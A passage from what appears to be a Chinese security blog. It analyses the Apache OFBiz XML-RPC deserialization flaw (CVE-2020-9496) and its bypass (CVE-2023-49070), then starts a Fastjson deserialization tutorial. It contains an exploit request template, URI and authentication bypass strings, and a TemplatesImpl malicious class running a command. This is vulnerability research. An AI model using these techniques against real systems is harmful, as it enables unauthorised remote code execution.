class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">struct</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">member</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>test<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">serializable</span> <span class="attr">xmlns</span>=<span class="string">&quot;&lt;http://ws.apache.org/xmlrpc/namespaces/extensions&gt;&quot;</span>&gt;</span>[base64-payload]<span class="tag">&lt;/<span class="name">serializable</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">member</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">struct</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732418416262-f3f4d876-325b-4290-b305-a106e8b5aa6c.png?x-oss-process=image/format,webp/resize,w_937,limit_0"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732418436068-089ca4ec-a6e6-470b-bd3a-9b4ff5ec4320.png?x-oss-process=image/format,webp/resize,w_937,limit_0"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="Web路由配置"><a href="#Web路由配置" class="headerlink" title="Web路由配置"></a>Web路由配置</h3><p>&#x2F;control&#x2F;*接口的处理是由org.apache.ofbiz.webapp.control.ControlServlet来操作。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- framework\\webtools\\webapp\\webtools\\WEB-INF\\web.xml --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Main Control Servlet<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.ofbiz.webapp.control.ControlServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/control/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="关键配置分析"><a href="#关键配置分析" class="headerlink" title="关键配置分析"></a>关键配置分析</h3><p>framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;web.xml中设置了enabledForExtensions为true，使XML-RPC支持<serializable>标签进行Java序列化数据传输。</p>
<p>&#x2F;WEB-INF&#x2F;controller.xml中xmlrpc URI的配置缺少auth选项（默认false），导致未授权访问。</p>
<h3 id="XXE防护机制"><a href="#XXE防护机制" class="headerlink" title="XXE防护机制"></a>XXE防护机制</h3><p>系统通过设置XmlRpcRequestParser作为ContentHandler并配置以下选项防御XXE：</p>
<ul>
<li>**disallow-doctype-decl：**禁止DOCTYPE声明，防止XML实体攻击</li>
<li>**load-external-dtd：**禁止加载外部DTD</li>
<li>**external-general-entities和external-parameter-entities：**禁止解析外部实体</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1734686898386-4ab6048c-2a57-4f84-954a-76c6df874177.png?x-oss-process=image/format,webp/resize,w_937,limit_0"></p>
<h3 id="漏洞触发流程"><a href="#漏洞触发流程" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h3><ol>
<li>ControlServlet处理&#x2F;control&#x2F;接口请求</li>
<li>doGet()函数调用getRequest()获取XmlRpcRequest实例</li>
<li>使用SAX解析XML内容</li>
<li>ContentHandler.startElement()解析XML标签，设置ContentHandler为XmlRpcRequestParser</li>
<li>识别serializable标签并通过SerializableParser处理</li>
<li>getResult()函数调用readObject()进行反序列化，触发漏洞</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1734687479663-c42a6892-cd69-4305-93dc-346b32f2b1a0.png?x-oss-process=image/format,webp"></p>
<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>官方更新：<a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a">https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a</a></p>
<p>主要修复措施：</p>
<ul>
<li>添加接口认证：要求访问&#x2F;webtools&#x2F;control&#x2F;xmlrpc必须进行身份验证</li>
<li>增加内容过滤：禁止&#x2F;control&#x2F;xmlrpc路径包含serializable标签的请求通过</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1734687739853-efec0178-9be9-46d2-9d58-a23921a43250.png?x-oss-process=image/format,webp/resize,w_811,limit_0"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/683328/1734690724682-5bb3f33c-e7c3-48c7-9524-5f663ec0d0b3.jpeg?x-oss-process=image/format,webp/resize,w_690,limit_0/interlace,1"></p>
<h1 id="CVE-2023-49070漏洞分析"><a href="#CVE-2023-49070漏洞分析" class="headerlink" title="CVE-2023-49070漏洞分析"></a>CVE-2023-49070漏洞分析</h1><p>CVE-2023-49070是对CVE-2020-9496补丁的绕过漏洞，主要利用了两个技术点：</p>
<h2 id="URI绕过技术"><a href="#URI绕过技术" class="headerlink" title="URI绕过技术"></a>URI绕过技术</h2><p>利用Tomcat的URI解析特性，使用&#x2F;control&#x2F;xmlrpc;&#x2F;格式绕过过滤器检查。</p>
<h2 id="认证绕过方法"><a href="#认证绕过方法" class="headerlink" title="认证绕过方法"></a>认证绕过方法</h2><p>认证绕过的关键在于满足以下条件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (username == <span class="literal">null</span></span><br><span class="line">                    || (password == <span class="literal">null</span> &amp;&amp; token == <span class="literal">null</span>)</span><br><span class="line">                    || <span class="string">&quot;error&quot;</span>.equals(login(request, response)))</span><br></pre></td></tr></table></figure>

<p>通过构造特殊URL格式实现绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xxxx/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y</span><br></pre></td></tr></table></figure>



<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzk0MTIxNzAyNw==&mid=2247483960&idx=1&sn=152320b737ddea7c1a29a5d3ba4dba83">https://mp.weixin.qq.com/s?__biz&#x3D;Mzk0MTIxNzAyNw&#x3D;&#x3D;&amp;mid&#x3D;2247483960&amp;idx&#x3D;1&amp;sn&#x3D;152320b737ddea7c1a29a5d3ba4dba83</a></p>
<p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2021/09/21/%E6%B5%85%E6%9E%90Ofbiz%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-9496%EF%BC%89">http://www.mi1k7ea.com/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/386458.html">https://www.freebuf.com/vuls/386458.html</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13168">https://xz.aliyun.com/t/13168</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/07/Apache%20OFBiz%20XML-RPC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="cm5l7vlhr0004fscx3dh1655v" data-title="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Apache OFBiz XML-RPC漏洞分析" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Fastjson反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time class="dt-published" datetime="2025-01-07T06:36:26.000Z" itemprop="datePublished">2025-01-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Fastjson反序列化</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Fastjson简介"><a href="#Fastjson简介" class="headerlink" title="Fastjson简介"></a>Fastjson简介</h2><p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject&#x2F;JSON.parse来分别实现序列化和反序列化操作。</p>
<h1 id="使用Fastjson进行序列化和反序列化"><a href="#使用Fastjson进行序列化和反序列化" class="headerlink" title="使用Fastjson进行序列化和反序列化"></a>使用Fastjson进行序列化和反序列化</h1><p>maven依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>Student.java，定义的一个学生类，其中包含两个属性及其getter&#x2F;setter方法，还有类的构造函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>FJTest.java，调用JSON.toJsonString()来序列化Student类对象 ：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FJTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.setName(<span class="string">&quot;Mi1k7ea&quot;</span>);</span><br><span class="line">        student.setAge(<span class="number">6</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span> JSON.toJSONString(student, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonstring);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="SerializerFeature-WriteClassName"><a href="#SerializerFeature-WriteClassName" class="headerlink" title="SerializerFeature.WriteClassName"></a>SerializerFeature.WriteClassName</h2><p>SerializerFeature.WriteClassName，是JSON.toJSONString()中的一个设置属性值，设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名，type可以指定反序列化的类，并且调用其getter&#x2F;setter&#x2F;is方法。</p>
<p>Fastjson接受的JSON可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。</p>
<p>输出如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 设置了SerializerFeature.WriteClassName</span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;&quot;@type&quot;:&quot;Student&quot;,&quot;age&quot;:6,&quot;name&quot;:&quot;Mi1k7ea&quot;&#125;</span><br><span class="line"></span><br><span class="line">// 未设置SerializerFeature.WriteClassName</span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;&quot;age&quot;:6,&quot;name&quot;:&quot;Mi1k7ea&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>FJTest2.java，调用JSON.parseObject()反序列化JSON为对象：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FJTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;Mi1k7ea\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">Student@75b9fd80</span><br><span class="line">Student</span><br><span class="line">反序列化类</span><br></pre></td></tr></table></figure>

<h2 id="Feature-SupportNonPublicField"><a href="#Feature-SupportNonPublicField" class="headerlink" title="Feature.SupportNonPublicField"></a>Feature.SupportNonPublicField</h2><p>如果需要还原出private属性的话，还需要在JSON.parseObject&#x2F;JSON.parse中加上Feature.SupportNonPublicField参数。</p>
<p>这里改下Student类，将私有属性age的setAge()函数注释掉（一般没人会给私有属性加setter方法，加了就没必要声明为private了）：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    public void setAge(int age) &#123;</span></span><br><span class="line">    <span class="comment">//        System.out.println(&quot;setAge&quot;);</span></span><br><span class="line">    <span class="comment">//        this.age = age;</span></span><br><span class="line">    <span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(32, 32, 32);"></font></p>
<p><font style="color:rgb(32, 32, 32);">修改FJTest2.java，去掉Feature.SupportNonPublicField，添加输出两个属性getter方法的返回值：</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FJTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;Mi1k7ea\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Student.class);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">        System.out.println(obj.getName() + <span class="string">&quot; &quot;</span> + obj.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(32, 32, 32);">重新运行，会看到获取不到私有变量age的值而是被设置为0：</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">Student@7addc524</span><br><span class="line">Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">Mi1k7ea 0</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(32, 32, 32);">接着添加Feature.SupportNonPublicField：</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Student</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(32, 32, 32);">再输出就能成功还原出age这个私有变量的值了：</font></p>
<p><font style="color:rgb(32, 32, 32);"></font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">Student@2c59109c</span><br><span class="line">Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">Mi1k7ea 6</span><br></pre></td></tr></table></figure>



<p>也就是说，若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行。</p>
<h2 id="setter、getter、is自动调用"><a href="#setter、getter、is自动调用" class="headerlink" title="setter、getter、is自动调用"></a>setter、getter、is自动调用</h2><p>在通过@type拿到类之后，通过反射拿到该类所有的方法存入methods，接下来遍历methods进而获取get、set方法。总结set方法自动调用的条件为：</p>
<ul>
<li>方法名长度大于4</li>
<li>非静态方法</li>
<li>返回值为void或当前类</li>
<li>方法名以set开头</li>
<li>参数个数为1</li>
</ul>
<p>当满足条件之后会从方法名截取属性名，截取时会判断_，如果是set_name会截取为name属性，当截取完但是找不到这个属性，会判断传入的第一个参数类型是否为布尔型，是的话就在截取完的变量前加上is，截取propertyName的第一个字符转大写和第二个字符，并且然后重新尝试获取属性字段。</p>
<p>set的整个判断就是：如果有setCmd()会绑定cmd属性，如果该类没有cmd属性会绑定isCmd属性。</p>
<p>get的判断</p>
<p>总结下就是：</p>
<ul>
<li>方法名长度大于等于4</li>
<li>非静态方法</li>
<li>以get开头且第4个字母为大写</li>
<li>无传入参数</li>
<li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li>
</ul>
<h2 id="parse与parseObject区别"><a href="#parse与parseObject区别" class="headerlink" title="parse与parseObject区别"></a>parse与parseObject区别</h2><p>parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。</p>
<p> parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>parse(jsonStr) ：构造方法+Json字符串指定属性的setter()+特殊的getter()</li>
<li>parseObject(jsonStr) ：构造方法+所有 setter 和 getter 方法。</li>
</ul>
<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="基于TemplateImpl的利用链"><a href="#基于TemplateImpl的利用链" class="headerlink" title="基于TemplateImpl的利用链"></a>基于TemplateImpl的利用链</h2><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>条件苛刻</p>
<p>服务端使用parseObject()时，必须使用如下格式才能触发漏洞：JSON.parseObject(input, Object.class, Feature.SupportNonPublicField)</p>
<p>服务端使用parse()时，需要JSON.parse(text1,Feature.SupportNonPublicField)。</p>
<p>原因：TemplatesImpl利用链的多个属性都是private</p>
<h3 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException 